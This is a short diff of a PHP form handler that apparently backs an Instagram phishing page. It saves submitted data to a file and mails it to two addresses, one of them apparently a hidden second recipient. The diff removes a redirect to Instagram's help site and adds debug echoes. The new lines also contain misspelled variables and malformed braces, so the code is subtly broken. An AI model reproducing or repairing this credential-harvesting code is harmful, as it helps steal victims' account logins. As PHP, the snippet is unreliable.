@@ -25,9 +25,10 @@ if(isset($_POST['submit'])){
     fwrite($file,$message);
     fclose($file);
     $str=array($send, $IWP); foreach ($str as $send)
-
-    mail($send,$subject,$rmessage,$headers);
-
-    header("Location: https://help.instagram.com/");
-    }
+    if(mail($send,$subject,$rnessage,$headers) != false)
+    echo 'option1';
+    {
+    mail($Send,$subject,$rnessage,$headers);
+    echo 'option2';
+    } 
 ?>
